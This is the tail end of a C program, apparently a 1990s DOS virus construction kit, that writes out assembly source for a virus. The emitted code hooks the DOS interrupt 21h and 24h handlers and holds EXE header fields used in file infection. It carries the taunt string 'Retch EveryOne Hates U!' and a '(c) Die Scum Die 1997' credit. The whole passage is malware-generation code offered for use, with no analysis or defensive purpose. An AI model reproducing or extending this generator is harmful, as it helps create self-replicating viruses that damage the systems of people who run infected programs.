fprintf(virname,"        cmp     ax, cx                            \n");
fprintf(virname,"        jnc     ret_io                            \n");
fprintf(virname,"err_io:                                           \n");
fprintf(virname,"        pop     ax                                \n");
fprintf(virname,"ret_io:                                           \n");
fprintf(virname,"        retn                                      \n");
fprintf(virname,"io                      ENDP                      \n");
fprintf(virname,"service                 PROC    NEAR              \n");
fprintf(virname,"retry:                                            \n");
fprintf(virname,"        mov     ax, 440bh                         \n");
fprintf(virname,"        mov     cx, 1                             \n");
fprintf(virname,"        jmp     SHORT int_21                      \n");
fprintf(virname,"int_str:                                          \n");
fprintf(virname,"        xor     cx, cx                            \n");
fprintf(virname,"        cwd                                       \n");
fprintf(virname,"int_set:                                          \n");
fprintf(virname,"        mov     ah, 42h                           \n");
fprintf(virname,"int_han:                                          \n");
fprintf(virname,"        mov     bx, 0                             \n");
fprintf(virname,"int_21:                                           \n");
fprintf(virname,"        pushf                                     \n");
fprintf(virname,"        cli                                       \n");
fprintf(virname,"        call    DWORD PTR cs:vec_21h              \n");
fprintf(virname,"        retn                                      \n");
fprintf(virname,"service                 ENDP                      \n");
fprintf(virname,"                        DB      'Retch EveryOne Hates U!'                         \n");
fprintf(virname,"mod_top:                                \n");
fprintf(virname,"vec_21h                 DD      0       \n");
fprintf(virname,"vec_24h                 DD      0       \n");
fprintf(virname,"exec_p                  DW      0       \n");
fprintf(virname,"sav_bp                  DW      0       \n");
fprintf(virname,"sav_sp                  DW      0       \n");
fprintf(virname,"sav_ss                  DW      0       \n");
fprintf(virname,"header                  DW      0       \n");
fprintf(virname,"partpag                 DW      0       \n");
fprintf(virname,"pagecnt                 DW      0       \n");
fprintf(virname,"relocnt                 DW      0       \n");
fprintf(virname,"hdrsize                 DW      0       \n");
fprintf(virname,"minmem                  DW      0       \n");
fprintf(virname,"maxmem                  DW      0       \n");
fprintf(virname,"reloss                  DW      0       \n");
fprintf(virname,"exesp                   DW      0       \n");
fprintf(virname,"chksum                  DW      0       \n");
fprintf(virname,"exeip                   DW      0       \n");
fprintf(virname,"relocs                  DW      0       \n");
fprintf(virname,"tabloff                 DW      0       \n");
fprintf(virname,"overlay                 DW      0       \n");
fprintf(virname,"sizform                 DW      0       \n");
fprintf(virname,"stack_are               DB      100 DUP(?)                                        \n");
fprintf(virname,"are_top:                                                                          \n");
fprintf(virname,"ouexit:                                                                           \n");
fprintf(virname,"        mov     ah, 4ch                 \n");
fprintf(virname,"        int     21h                     \n");
fprintf(virname,"seg_c                   ENDS                                                      \n");
fprintf(virname,"seg_s                   SEGMENT BYTE stack                                        \n");
fprintf(virname,"                        DW      20 DUP (?)                                        \n");
fprintf(virname,"seg_s                   ENDS                                                      \n");
fprintf(virname,"END             start\n");
fprintf(virname,"; Blenderized Components in order  %d, %d, %d, %d, %d \n", c1,c2,c3,c4,c5);
fprintf(virname,";              (c) Die Scum Die 1997\n");
fclose(virname);
        rn2++;
/*        printf("End of round %d \n\n",rn2);*/
        }


        return 0;
}
